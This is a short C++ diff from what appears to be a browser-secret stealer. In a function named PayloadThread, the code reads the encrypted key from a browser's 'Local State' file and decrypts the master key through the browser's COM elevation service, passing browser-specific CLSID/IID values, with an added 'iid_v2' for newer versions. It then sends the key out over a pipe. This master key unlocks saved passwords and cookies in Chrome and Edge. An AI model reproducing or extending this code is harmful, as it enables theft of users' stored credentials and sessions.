@@ -53,7 +53,7 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
         if (!pipe.IsValid()) return 1;
 
         auto config = pipe.ReadConfig();
-        auto browser = DetectBrowser();
+        auto browser = GetConfigs().at(config.browserType);
 
         pipe.LogDebug("Running in " + browser.name);
 
@@ -66,7 +66,7 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
         {
             Com::Elevator elevator;
             auto encKey = GetEncryptedKey(browser.userDataPath / "Local State");
-            masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.name == "Edge");
+            masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge");
         }
         
         // Send key as structured message
